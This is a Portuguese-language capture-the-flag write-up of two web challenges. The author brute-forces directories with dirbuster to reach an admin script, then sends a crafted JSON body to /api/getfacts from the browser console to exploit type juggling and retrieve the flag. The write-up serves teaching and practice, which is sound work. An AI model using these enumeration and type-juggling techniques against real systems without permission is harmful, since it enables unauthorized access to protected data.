# Capture The Flag - Menina de CyberSec

# CTF

CTF (Capture The Flag) realizado entre os dias 12 e 15 de Novembro, no servidor Menina de CyberSec.

# WEB

![](/meninaCyberSec/pics/web2.png)

## Desafio: Não odeio o JavaScript! :triangular_flag_on_post:

<code>formato da flag **MCS{xxxx_xxxx_xxxx_xxx}**</code>

```
Esse desafio tinha um arquivo .txt e ao abri-lo, tinha endereço do site para analisarmos.
```

### Análise

1. Analisei o page source
2. Na pagina tinha dois buttons, cliquei em ambos com o console e network abertos.

O segundo button me chamou atenção. Ao clicar aparecia a seguinte mensagem na página:

```bash
Secrets can only be accessed by admin
```

A palavra **admin** poderia me levar para algum diretório ou poderia existir um diretório de login</br>
Tentei acessa a URL com o <strong>/admin</strong> e retornou:

```bash
403 Forbidden
```

Status code **403** de não permitido. Diretório existe, mas eu não tenho permissão. </br>

Utilizando a ferramenta <strong>dirbuster</strong> técnica de bruteforce para encontrar objetos, arquivos e diretórios do site, me retornou algums diretórios com status code <strong>200</strong>, ou seja diretórios que não precisam de autorização para acessar.</br>

```bash
200 /admin/admin.js
200 static/js/index.js
```

Acessei **url/admin/admin.js** e nesse arquivo estava a flag:

> "MCS{3num3r4t10n_F0rfun_4nd_Pr0f1t}"

<hr>

## Desafio: Nosferatu :triangular_flag_on_post:

<code>Formato da flag: MCS{xxxx_xxxx_xxxx_xxxx_xxxx}</code>

Continuação da análise do site.</br>

Como tinha me retornado a url <strong>static/js/index.js</strong>, eu acessei e me retornou o diretório com a regra de negócio da aplicação. </br>

## Análise

Analisei o código **index.js** e vi que na regra de negócio tinha uma requisição POST **/api/getfacts** </br>

Na página do button 2, não aparece o array com as informações. Caindo diretamente no **else**

```js
 facts_html = '<div></div><div class="error">Secrets can only be accessed by admin</div>';
```

Ou seja, o body tá indo vazio/false.

```js
const loadfacts = async (fact_type) => {
    await fetch('/api/getfacts', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 'type': fact_type })
    })
        .then((response) => response.json())
        .then((res) => {
            if (!res.hasOwnProperty('facts')){
                populate([]);
                return;
            }

            populate(res.facts);
        });
}
```

O que eu posso tentar é passar como true no body e rodar o scritp no console do navegador.

```js
fetch('/api/getfacts', {
  'method': 'POST',
  'headers': {
    'Content-Type': 'application/json'
  },
  'body': "{\"type\":true}"
}).then((response)=>response.json()).
    then((response)=>console.log(response));
```

![](/meninaCyberSec/pics/flga2.png)

E a flag foi retornada:

> MCS{0wn3d_fl4g_f0r_typ3_Juggl1ng}
